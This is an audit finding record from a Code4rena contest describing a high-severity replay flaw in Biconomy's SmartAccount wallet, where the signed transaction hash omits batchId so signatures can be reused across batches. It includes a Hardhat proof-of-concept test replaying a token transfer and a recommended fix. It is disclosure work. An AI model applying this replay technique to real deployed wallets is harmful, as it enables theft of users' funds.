---
# Core Classification
protocol: Biconomy
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 6446
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2023-01-biconomy-smart-contract-wallet-contest
source_link: https://code4rena.com/reports/2023-01-biconomy
github_link: https://github.com/code-423n4/2023-01-biconomy-findings/issues/36

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.87
financial_impact: high

# Scoring
quality_score: 4.333333333333333
rarity_score: 4

# Context Tags
tags:

protocol_categories:
  - dexes
  - bridge
  - cdp
  - services
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 14
finders:
  - csanuragjain
  - rom
  - orion
  - ro
  - Koolex
---

## Vulnerability Title

[H-07] Replay attack (EIP712 signed transaction)

### Overview


This bug report is about a vulnerability in the code of the SmartAccount contract. The vulnerability allows signed transactions to be replayed, meaning that the first user transaction can always be replayed any amount of times. The vulnerability is possible because the contract checks the nonce of the transaction, but not the batchId itself, allowing attackers to reuse other batches' nonces. The bug report includes a proof of concept code which shows how the vulnerability can be exploited.

The recommended mitigation steps to fix this vulnerability are to add the batchId to the hash calculation of the transaction in the 'encodeTransactionData' function. This will ensure that the batchId is checked, preventing attackers from reusing other batches' nonces.

### Original Finding Content


[contracts/smart-contract-wallet/SmartAccount.sol#L212](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212)<br>

Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never disappears.

### Why it is possible

Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.

### Proof of Concept

Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:

    it("replay EIP712 sign transaction", async function () {
      await token
      .connect(accounts[0])
      .transfer(userSCW.address, ethers.utils.parseEther("100"));

    const safeTx: SafeTransaction = buildSafeTransaction({
      to: token.address,
      data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),
      nonce: await userSCW.getNonce(0),
    });

    const chainId = await userSCW.getChainId();
    const { signer, data } = await safeSignTypedData(
      accounts[0],
      userSCW,
      safeTx,
      chainId
    );

    const transaction: Transaction = {
      to: safeTx.to,
      value: safeTx.value,
      data: safeTx.data,
      operation: safeTx.operation,
      targetTxGas: safeTx.targetTxGas,
    };
    const refundInfo: FeeRefund = {
      baseGas: safeTx.baseGas,
      gasPrice: safeTx.gasPrice,
      tokenGasPriceFactor: safeTx.tokenGasPriceFactor,
      gasToken: safeTx.gasToken,
      refundReceiver: safeTx.refundReceiver,
    };

    let signature = "0x";
    signature += data.slice(2);


    await expect(
      userSCW.connect(accounts[2]).execTransaction(
        transaction,
        0, // batchId
        refundInfo,
        signature
      )
    ).to.emit(userSCW, "ExecutionSuccess");

    //contract checks nonces[batchId] but not batchId itself
    //so we can change batchId to the one that have the same nonce
    //this would replay transaction
    await expect(
      userSCW.connect(accounts[2]).execTransaction(
        transaction,
        1, // changed batchId
        refundInfo,
        signature
      )
    ).to.emit(userSCW, "ExecutionSuccess");

    //charlie would have 20 tokens after this
    expect(await token.balanceOf(charlie)).to.equal(
      ethers.utils.parseEther("20")
    );
    });

### Recommended Mitigation Steps

Add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function.

**[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/36#issuecomment-1404370864)**



***
 


### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 4.333333333333333/5 |
| Rarity Score | 4/5 |
| Audit Firm | Code4rena |
| Protocol | Biconomy |
| Report Date | N/A |
| Finders | csanuragjain, rom, orion, ro, Koolex, peakbolt, Tricko, HE1M, Tointer, 0xdeadbeef0x, Haipls, taek, V_B, PwnedNoMore |

### Source Links

- **Source**: https://code4rena.com/reports/2023-01-biconomy
- **GitHub**: https://github.com/code-423n4/2023-01-biconomy-findings/issues/36
- **Contest**: https://code4rena.com/contests/2023-01-biconomy-smart-contract-wallet-contest

### Keywords for Search

`vulnerability`

